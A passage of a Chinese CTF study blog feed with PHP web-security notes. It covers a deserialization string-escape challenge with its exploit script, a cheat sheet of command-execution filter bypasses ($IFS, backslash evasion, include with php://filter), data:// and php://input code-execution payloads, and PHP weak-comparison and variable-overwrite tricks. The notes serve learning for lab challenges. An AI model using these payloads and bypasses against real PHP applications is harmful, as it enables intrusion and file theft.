class="variable">$filter</span> = <span class="keyword">array</span>(<span class="string">&#x27;NSS&#x27;</span>, <span class="string">&#x27;CTF&#x27;</span>, <span class="string">&#x27;OTL_QAQ&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$filter</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cata&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/object/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cata&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cata&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$cc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">catalogue</span>(); </span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cc</span>));           </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono,you can not do that!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$abscond</span> = <span class="keyword">new</span> <span class="title function_ invoke__">escape</span>();</span><br><span class="line">        <span class="variable">$abscond</span>-&gt;name = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$abscond</span>-&gt;phone = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">        <span class="variable">$abscond</span>-&gt;email = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$abscond</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$abscond</span>);</span><br><span class="line">        <span class="variable">$escape</span> = <span class="title function_ invoke__">get_object_vars</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">abscond</span>(<span class="variable">$abscond</span>)));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$escape</span>[<span class="string">&#x27;phone&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$escape</span>[<span class="string">&#x27;email&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们仔细观察源码会发现，该题目有两种解法，一种是利用原生类一种是利用字符串逃逸，这里我只讲字符逃逸的部分。<br>我们只要给cata随便传个值就会到下面这句代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;nonono,you can not do that!&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$abscond</span> = <span class="keyword">new</span> <span class="title function_ invoke__">escape</span>();</span><br><span class="line">       <span class="variable">$abscond</span>-&gt;name = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">       <span class="variable">$abscond</span>-&gt;phone = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">       <span class="variable">$abscond</span>-&gt;email = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">       <span class="variable">$abscond</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$abscond</span>);</span><br><span class="line">       <span class="variable">$escape</span> = <span class="title function_ invoke__">get_object_vars</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">abscond</span>(<span class="variable">$abscond</span>)));</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$escape</span>[<span class="string">&#x27;phone&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$escape</span>[<span class="string">&#x27;email&#x27;</span>]));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><br>我们可以看到其会使用file_get_contents这个函数来获取文件内容到字符串中，但是我们可以看到email设了waf不可以传入email的值为flag。但是我们可以看到其在序列化之前先使用waf来替换了一下字符串abscond($abscond)<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abscond</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="keyword">array</span>(<span class="string">&#x27;NSS&#x27;</span>, <span class="string">&#x27;CTF&#x27;</span>, <span class="string">&#x27;OTL_QAQ&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$filter</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个waf会将NSS转化成hacker。这就导致了字符的增多。我们可以考虑使用字符逃逸来修改email的值。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;escape&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br><span class="line">````</span><br><span class="line">如果反序列化为上面的语句就会使email为<span class="string">&quot;/flag&quot;</span>使flag被输出。</span><br><span class="line">但是waf的存在导致我们无法直接构造上面的这句话。那么我们就需要逃逸。由于要求phone为数组所以我们要连着phone一起逃逸。即逃逸语句为`<span class="string">&quot;;s:5:&quot;</span>phone<span class="string">&quot;;a:1:&#123;i:0;s:4:&quot;</span>aaaa<span class="string">&quot;;&#125;s:5:&quot;</span>email<span class="string">&quot;;s:5:&quot;</span>/flag<span class="string">&quot;;&#125;`改逃逸语句为60个字符即我们要多60个字符才能使其逃逸。</span></span><br><span class="line"><span class="string">exp</span></span><br><span class="line"><span class="string">```php</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">class escape&#123;</span></span><br><span class="line"><span class="string">public <span class="subst">$name</span> = &#x27;NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSS&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">public $phone=array(aaaa);</span></span><br><span class="line"><span class="string">public $email = &#x27;</span><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$a=new escape();</span></span><br><span class="line"><span class="string">echo urlencode(serialize($a));</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><br>所以我们只要给name传值为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSS&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:4:&quot;aaaa&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></pre></td></tr></table></figure><br>即可</p>
]]></content>
      <categories>
        <category>php</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php命令执行</title>
    <url>/2024/02/04/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="我发现我经常会忘记php命令执行的绕过的方式所以我想这在这里写这篇关于php命令执行的总结以及题目的总结"><a href="#我发现我经常会忘记php命令执行的绕过的方式所以我想这在这里写这篇关于php命令执行的总结以及题目的总结" class="headerlink" title="我发现我经常会忘记php命令执行的绕过的方式所以我想这在这里写这篇关于php命令执行的总结以及题目的总结"></a>我发现我经常会忘记php命令执行的绕过的方式所以我想这在这里写这篇关于php命令执行的总结以及题目的总结</h1><h1 id="命令执行的常见函数"><a href="#命令执行的常见函数" class="headerlink" title="命令执行的常见函数"></a>命令执行的常见函数</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="title function_ invoke__">system</span>()<span class="comment">//有回显</span></span><br><span class="line"><span class="number">2</span>.<span class="title function_ invoke__">exec</span>()<span class="comment">//无回显，返回值为数组,需要使用print_r()输出</span></span><br><span class="line"><span class="number">3</span>.<span class="title function_ invoke__">passthru</span>()<span class="comment">//有回显，与system差不多</span></span><br><span class="line"><span class="number">4</span>.<span class="title function_ invoke__">shell_exec</span>()<span class="comment">//无回显，返回值为字符串，使用echo或print()</span></span><br><span class="line"><span class="number">5</span>.<span class="title function_ invoke__">popen</span>()<span class="comment">//返回的是一个文件类型可以使用echo fread(popen(&#x27;ls&#x27;,&#x27;r&#x27;),1000);执行。</span></span><br><span class="line"><span class="number">6</span>.``无回显需要使用<span class="keyword">echo</span>输出</span><br></pre></td></tr></table></figure>
<h1 id="常见的读取命令"><a href="#常见的读取命令" class="headerlink" title="常见的读取命令"></a>常见的读取命令</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls <span class="comment">//目录读取</span></span><br><span class="line">find<span class="comment">//目录读取</span></span><br><span class="line">dir <span class="comment">//目录读取</span></span><br><span class="line">cat <span class="comment">//文件读取（正向读取）</span></span><br><span class="line">tac <span class="comment">//文件读取（反向读取）</span></span><br><span class="line">more<span class="comment">//文件读取（东西多的时候一页一页读取）</span></span><br><span class="line">less<span class="comment">//和more相似</span></span><br><span class="line">tail<span class="comment">//读取文件的最后几行</span></span><br><span class="line">nl  <span class="comment">//显示时顺便输出行号</span></span><br><span class="line">od  <span class="comment">//以二进形式读取文档 可以直接使用也可以system(&#x27;od -A d -c fla\g.php&#x27;)；这么使用</span></span><br><span class="line">xdd <span class="comment">//与od相似</span></span><br><span class="line">sort<span class="comment">//排序，同样也会输出。</span></span><br><span class="line">file -f<span class="comment">//利用报错进行输出</span></span><br><span class="line">grep<span class="comment">//在某个文件内查找字符。可以这么用system(&#x27;grep * fla\g.php&#x27;);或者system(&#x27;grep fl fla\g.php&#x27;);直接查找有fl的那一行</span></span><br></pre></td></tr></table></figure>
<h1 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>空格一般可以通过如下方式进行替代</p>
<h3 id="1-大括号绕过"><a href="#1-大括号绕过" class="headerlink" title="1.大括号绕过"></a>1.大括号绕过</h3><p>格式如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;&#123;cat,flag&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></p>
<h3 id="2-IFS绕过"><a href="#2-IFS绕过" class="headerlink" title="2.$IFS绕过"></a>2.$IFS绕过</h3><p>在linux里可以使用<code>$IFS</code>,<code>$IFS$9</code>(数字可以是1到9),${IFS}</p>
<h3 id="3-重定向符绕过"><a href="#3-重定向符绕过" class="headerlink" title="3.重定向符绕过"></a>3.重定向符绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&gt;</span><br><span class="line">&lt;（原理为加文件内容重定向到cat里）</span><br><span class="line">system(&#x27;cat&lt;flag&#x27;);</span><br></pre></td></tr></table></figure>
<h2 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="\反斜杠绕过"></a>\反斜杠绕过</h2><p>在正则配合是如果匹配的为flag那么我们就可以尝试使用\来进行绕过。如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;cat f\lag&#x27;);</span><br></pre></td></tr></table></figure></p>
<h2 id="分号过滤"><a href="#分号过滤" class="headerlink" title=";分号过滤"></a>;分号过滤</h2><p>当题目将;进行过滤时我们可以使用?&gt;来代替分号，这是因为eval将其参数当成php代码执行，使用?&gt;是直接结束了程序，即该句代码为最后一句即不需要;。</p>
<h1 id="文件包含读取"><a href="#文件包含读取" class="headerlink" title="文件包含读取"></a>文件包含读取</h1><p>文件包含读取其一般要利用到php伪协议，具体看这个博客<a href="https://blog.csdn.net/Jeff_12138/article/details/124815370">php伪协议</a><br>常用如下几个伪协议，其他详细可以看上面的。</p>
<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>这个协议是用来查看文件内容的，由于我们在文件包含php文件时，由于存在标签&lt;?php ?&gt;所以并不会将文件内容输出，而是执行代码，这样我们就无法查看文件内容，所以当我们可以使用<code>php://filter/read=convert.base64-encode/resource=</code>来对读取的文件进行base64编码使其不会被识别为php代码。</p>
<h3 id="php-input-POST-DATA-执行php代码"><a href="#php-input-POST-DATA-执行php代码" class="headerlink" title="php://input + [POST DATA]执行php代码"></a>php://input + [POST DATA]执行php代码</h3><p>这个伪协议会将post传入的内容当成php代码执行<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><br>post传入内容仍需要安装php的格式</p>
<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>data://text/plain,<br>data://text/plain;base64，</p>
<h3 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data://text/plain,"></a>data://text/plain,</h3><p>在后面加上要执行的php命令，后端会执行该php指令<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="data-text-plain-base64"><a href="#data-text-plain-base64" class="headerlink" title="data://text/plain;base64,"></a>data://text/plain;base64,</h3><p>同上只不过后面的命令是经过base64编码的代码。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;ls&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>最好使用上面的格式进行书写后再base64编码。</p>
<h2 id="补充上面的为协议中的php代码可以使用-lt-gt-短标签来代替-lt-php-gt"><a href="#补充上面的为协议中的php代码可以使用-lt-gt-短标签来代替-lt-php-gt" class="headerlink" title="补充上面的为协议中的php代码可以使用&lt;?=   ?&gt;短标签来代替&lt;?php ?&gt;"></a>补充上面的为协议中的php代码可以使用&lt;?=   ?&gt;短标签来代替&lt;?php ?&gt;</h2><h1 id="在php命令执行的文件包含读取，一般也算参数逃逸使用方法如下"><a href="#在php命令执行的文件包含读取，一般也算参数逃逸使用方法如下" class="headerlink" title="在php命令执行的文件包含读取，一般也算参数逃逸使用方法如下"></a>在php命令执行的文件包含读取，一般也算参数逃逸使用方法如下</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>当防火墙过滤了单双引号和括号时我们无法使用<code>eval($_GET[1]);</code>进行逃逸者时候我们需要使用无括号的函数进行逃逸即include。我们可以这么写<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include%0A$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=</span><br></pre></td></tr></table></figure><br>我们可以使用php伪协议配合<code>include $_GET[1]</code>进行逃逸。</p>
<h1 id="利用-GET或-POST参数逃逸绕过"><a href="#利用-GET或-POST参数逃逸绕过" class="headerlink" title="利用$_GET或$_POST参数逃逸绕过"></a>利用<code>$_GET</code>或<code>$_POST</code>参数逃逸绕过</h1><p>有的题目可以利用将参数赋值为c=eval<code>($_GET[1]);</code>后向参数1传递一个命令如1=phpinfo();进行绕过由于过滤的参数为c防火墙不会过滤1所以可以绕过</p>
<h1 id="无参数rce请求头绕过"><a href="#无参数rce请求头绕过" class="headerlink" title="无参数rce请求头绕过"></a>无参数rce请求头绕过</h1><p>#</p>
]]></content>
      <categories>
        <category>php</category>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>php特性</title>
    <url>/2024/03/15/php%E7%89%B9%E6%80%A7-1/</url>
    <content><![CDATA[<h1 id="由于本人发现我对php的特性只有浅显的认知，尤其是对正则表达式的认知不够充分所以写下这篇文章"><a href="#由于本人发现我对php的特性只有浅显的认知，尤其是对正则表达式的认知不够充分所以写下这篇文章" class="headerlink" title="由于本人发现我对php的特性只有浅显的认知，尤其是对正则表达式的认知不够充分所以写下这篇文章"></a>由于本人发现我对php的特性只有浅显的认知，尤其是对正则表达式的认知不够充分所以写下这篇文章</h1><h1 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h1><p>首先就是老生常谈的弱比教了。<br>由于对这块还是较为属性所以我就记录一些弱类型比较的函数就好<br>注意:一般弱比较只有在不同类型进行比较是才会展现出特性。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p>in_array()在数组中查找字符，找到返回true，没找到返回false<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">in_array</span>(<span class="number">0</span>,<span class="variable">$array</span>);</span><br><span class="line">-------</span><br><span class="line"><span class="keyword">bool</span>(ture)</span><br></pre></td></tr></table></figure></p>
<h3 id="array-search"><a href="#array-search" class="headerlink" title="array_search()"></a>array_search()</h3><p>这个函数在数组中搜索给定的值，并返回键名（如果找到的话）。它是非严格的，意味着在比较时不会检查数据类型。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1aaaa&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="number">1</span>, <span class="variable">$array</span>); <span class="comment">// 这里会找到，因为 &#x27;1&#x27; 会被转换为整数 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>; <span class="comment">// 输出 1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="array-keys"><a href="#array-keys" class="headerlink" title="array_keys()"></a>array_keys()</h3><p>当与可选的 search_value 参数一起使用时，array_keys() 函数会返回所有匹配该值的键名。这也是非严格的比较。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;cherry&#x27;</span>);</span><br><span class="line"><span class="variable">$keys</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$array</span>, <span class="number">0</span>); <span class="comment">// 搜索值为 &#x27;banana&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$keys</span>); </span><br><span class="line"><span class="comment">/* 输出 </span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">[0] =&gt; a</span></span><br><span class="line"><span class="comment">[1] =&gt; b</span></span><br><span class="line"><span class="comment">[2] =&gt; c</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><br>我们可以发现其返回了所有键这是因为弱类型比较导致了字符和0被当成相等的。</p>
<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>也是老生常谈的php漏洞了，主要成因是<code>$$a=$$b</code>发生了这样的双重赋值。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span>=flag_in_here</span><br><span class="line"><span class="variable">$c</span>=hahahaha</span><br><span class="line"><span class="variable">$a</span>=flag</span><br><span class="line"><span class="variable">$b</span>=c</span><br><span class="line"><span class="variable">$$b</span>=<span class="variable">$$a</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span></span><br></pre></td></tr></table></figure><br>上面的代码并不会输出hahahaha而会输出<code>$flag</code>的值<br>这就因为<code>$b</code>指向c而<code>$$b</code>就代表了<code>$c``$$a</code>同理代表<code>$flag</code>这就导致了变量覆盖<br>有时候变量覆盖和输出会出现在函数里这时候我们可以尝试将变量覆盖为GLOBALS全局变量,这个变量保存了脚本所有的变量.</p>
<h1 id="某些值得单领出来讲的函数"><a href="#某些值得单领出来讲的函数" class="headerlink" title="某些值得单领出来讲的函数"></a>某些值得单领出来讲的函数</h1><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p>intval()这个函数还是挺有意思的所以我单领出来讲一讲<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1,如果参数为一个类返回0。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] )</span><br><span class="line"></span><br><span class="line"><span class="variable">$var</span>：要转换成 <span class="keyword">integer</span> 的数量值。</span><br><span class="line"><span class="variable">$base</span>：转化所使用的进制。</span><br><span class="line">如果 base 是 <span class="number">0</span>，通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：</span><br><span class="line"></span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">将使用 <span class="number">10</span> 进制 (decimal)。</span><br></pre></td></tr></table></figure>
<p>参数为数组时，空数组返回0非空数组返回1</p>
<h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file()"></a>is_file()</h2><p>这个函数的参数为存在的文件,如一个网页中的index.php之类的,会返回.如果我们要读取文件并且绕过这个函数的化我们可以使用<br>php伪协议,该函数不会将php伪协议的如php://filter当成文件<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如上面的代码我们就可以使用php伪协议来绕过is_file<br>payload<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure></p>
<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><p>ereg 函数在 PHP 5.3.0 版本中被废弃，而在 PHP 7.0.0 版本中已经被完全移除<br>而这个函数本身就有一个漏洞就是NULL截断漏洞即%00截断漏洞<br>也就是说我们在进行正则匹配时可以使用%00截断之后夹带私货.<br>其函数检测到%00就不会在匹配下去.</p>
<h2 id=""><a href="#" class="headerlink" title="_()"></a><code>_()</code></h2><p>在打开gettext拓展时我们可以使用<em>()这个函数<br>没错啊有这个函数</em>()是唯一一个以特殊特殊字符为名的<br>这个函数的真正作用时翻译，其返回值时翻译后的字符，但是一般返回值为正常的英文字母，即返回值有可能为原值。</p>
<h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p>这个函数的返回值为当前脚本的全部变量</p>
<h1 id="传地址。"><a href="#传地址。" class="headerlink" title="传地址。"></a>传地址。</h1><p>是的php也是有传地址的，符合也是&amp;。<br>我们来看一道抽象的php传址的题目<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span 